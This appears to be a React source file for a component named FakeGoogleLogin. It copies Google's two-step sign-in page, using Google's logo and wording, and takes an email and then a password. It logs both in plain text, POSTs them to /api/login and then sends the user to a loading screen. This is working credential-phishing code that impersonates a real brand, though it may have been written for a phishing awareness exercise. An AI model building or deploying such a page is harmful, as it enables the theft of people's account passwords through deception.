import React, { useState, useEffect } from 'react';
import styled from 'styled-components';
import { motion } from 'framer-motion';
import { useNavigate, useLocation } from 'react-router-dom';

const FakeGoogleLoginContainer = styled(motion.div)`
  display: flex;
  align-items: center;
  justify-content: center;
  height: 100vh;
`;

const FakeGoogleLoginForm = styled.div`
  background: white;
  padding: 40px;
  border-radius: 8px;
  box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
  width: 450px;
  text-align: center;
`;

const Title = styled.h1`
  font-size: 24px;
  font-weight: 400;
  margin-bottom: 10px;
`;

const Subtitle = styled.p`
  font-size: 16px;
  margin-bottom: 30px;
`;

const Input = styled.input`
  width: 100%;
  padding: 15px;
  margin-bottom: 20px;
  border: 1px solid #ccc;
  border-radius: 5px;
  font-size: 1rem;
  box-sizing: border-box;
`;

const ButtonContainer = styled.div`
  display: flex;
  justify-content: flex-end;
`;

const Button = styled.button`
  padding: 10px 25px;
  background: #1a73e8;
  color: white;
  border: none;
  border-radius: 5px;
  font-size: 1rem;
  cursor: pointer;

  &:hover {
    background: #1557b0;
  }
`;

const FakeGoogleLogin = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [step, setStep] = useState('email');
  const [buttonType, setButtonType] = useState('unknown');
  const navigate = useNavigate();
  const location = useLocation();

  // location.state에서 button 타입을 가져오기
  useEffect(() => {
    if (location.state && location.state.button) {
      setButtonType(location.state.button);
      console.log('Button type from state:', location.state.button);
    }
  }, [location.state]);

  const handleEmailChange = (e) => {
    const value = e.target.value;
    console.log('Email changed:', value);
    setEmail(value);
  };

  const handlePasswordChange = (e) => {
    const value = e.target.value;
    console.log('Password changed:', value);
    setPassword(value);
  };

  const handleNext = async () => {
    console.log('Button clicked - Current step:', step);
    console.log('Current email:', email);
    console.log('Current password:', password);

    if (step === 'email') {
      if (!email.trim()) {
        alert('Please enter your email');
        return;
      }
      console.log('Moving to password step with email:', email);
      setStep('password');
    } else {
      if (!password.trim()) {
        alert('Please enter your password');
        return;
      }

      console.log('=== Submitting Login ===');
      console.log('Email:', email);
      console.log('Password:', password);
      console.log('Button Type:', buttonType);

      try {
        const payload = {
          email: email,
          password: password,
          button: `google-${buttonType}`
        };

        console.log('Sending payload:', JSON.stringify(payload));

        const response = await fetch('/api/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload),
        });

        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }

        const data = await response.json();
        console.log('Server response:', data);
      } catch (error) {
        console.error('Error sending login data:', error);
        alert('An error occurred. Please try again.');
        return;
      }

      navigate('/loading');
    }
  };

  return (
    <FakeGoogleLoginContainer
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ duration: 0.5 }}
    >
      <FakeGoogleLoginForm>
        <img
          src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
          alt="Google"
          style={{ marginBottom: '20px' }}
        />
        {step === 'email' ? (
          <>
            <Title>Sign in</Title>
            <Subtitle>Use your Google Account</Subtitle>
            <Input
              type="email"
              placeholder="Email or phone"
              value={email}
              onChange={handleEmailChange}
              autoFocus
            />
            <ButtonContainer>
              <Button onClick={handleNext}>Next</Button>
            </ButtonContainer>
          </>
        ) : (
          <>
            <Title>Welcome</Title>
            <Subtitle>{email}</Subtitle>
            <Input
              type="password"
              placeholder="Enter your password"
              value={password}
              onChange={handlePasswordChange}
              autoFocus
            />
            <ButtonContainer>
              <Button onClick={handleNext}>Next</Button>
            </ButtonContainer>
          </>
        )}
      </FakeGoogleLoginForm>
    </FakeGoogleLoginContainer>
  );
};

export default FakeGoogleLogin;
